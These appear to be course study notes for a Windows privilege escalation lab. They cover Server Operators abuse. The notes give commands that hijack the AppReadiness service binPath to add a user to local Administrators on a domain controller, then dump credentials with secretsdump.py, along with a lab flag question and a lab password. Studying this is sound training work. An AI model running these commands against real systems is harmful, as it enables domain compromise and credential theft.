# Server Operators

## ID
707

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 15 — Server Operators

## Description
Abuse Server Operators group membership to hijack a SYSTEM service binary path, add yourself to local Administrators, and gain full control of the Domain Controller.

## Tags
server-operators, service-hijack, sc-config, privilege-escalation, domain-controller, windows

## Commands
- `sc qc AppReadiness` (confirm service runs as LocalSystem)
- `c:\Tools\PsService.exe security AppReadiness` (check service permissions)
- `sc config AppReadiness binPath= "cmd /c net localgroup Administrators <USER> /add"`
- `sc start AppReadiness`
- `net localgroup Administrators`
- `crackmapexec smb <DC_IP> -u <USER> -p '<PASS>'`
- `secretsdump.py <USER>@<DC_IP> -just-dc-user administrator`

## What This Section Covers
Server Operators can administer Windows servers without Domain Admin privileges. The group has SERVICE_ALL_ACCESS on many services, meaning members can modify service binary paths. By pointing a SYSTEM service at a command that adds your user to local Administrators, you escalate to full admin on the DC — then use secretsdump to extract all domain credentials.

## Methodology
1. RDP in and open an **elevated** CMD.
2. Find a service running as LocalSystem: `sc qc AppReadiness`.
3. Confirm Server Operators has full control: `PsService.exe security AppReadiness`.
4. Change the binary path: `sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`.
5. Start the service: `sc start AppReadiness` — it will fail with error 1053, but the command executes.
6. Verify: `net localgroup Administrators` — your user should be listed.
7. Sign out and RDP back in for the new membership to apply.
8. Read the flag or proceed with post-exploitation (secretsdump, etc.).

## Multi-step Workflow
```
# Elevated CMD
sc qc AppReadiness
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
sc start AppReadiness
net localgroup Administrators

# Sign out → RDP back in
type C:\Users\Administrator\Desktop\ServerOperators\flag.txt

# Post-exploitation from attack box
crackmapexec smb <DC_IP> -u server_adm -p 'HTB_@cademy_stdnt!'
secretsdump.py server_adm@<DC_IP> -just-dc-user administrator
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Flag at `c:\Users\Administrator\Desktop\ServerOperators\flag.txt` | (submit from your shell) | sc config service hijack → local admin → sign out → RDP back in → type flag |

## Key Takeaways
- Server Operators have SERVICE_ALL_ACCESS on many services — this means full control: modify, start, stop.
- The service start **will fail** (error 1053) because `cmd /c net localgroup...` isn't a valid service binary — but the command still executes before the timeout.
- Like DnsAdmins, you must **sign out and RDP back in** after adding to Administrators for the group to take effect.
- Once local admin on a DC, the domain is fully compromised — use `secretsdump.py` to extract all NTDS hashes.
- `PsService.exe security <SERVICE>` is the clean way to check service ACLs — look for `[ALLOW] BUILTIN\Server Operators` with `All`.
- The `binPath=` syntax requires a **space after the equals sign** — `binPath= "cmd..."` not `binPath="cmd..."`.

## Gotchas
- Space after `binPath=` is mandatory — `sc config` silently fails without it.
- Must run from an **elevated** CMD prompt or sc config will be denied.
- The service fails to start (error 1053) — this is expected and does NOT mean the command didn't run.
- After adding to local admins, sign out and reconnect — the current session won't have the new group token.
- On real engagements, restore the original binPath afterward: `sc config AppReadiness binPath= "C:\Windows\System32\svchost.exe -k AppReadiness -p"`.
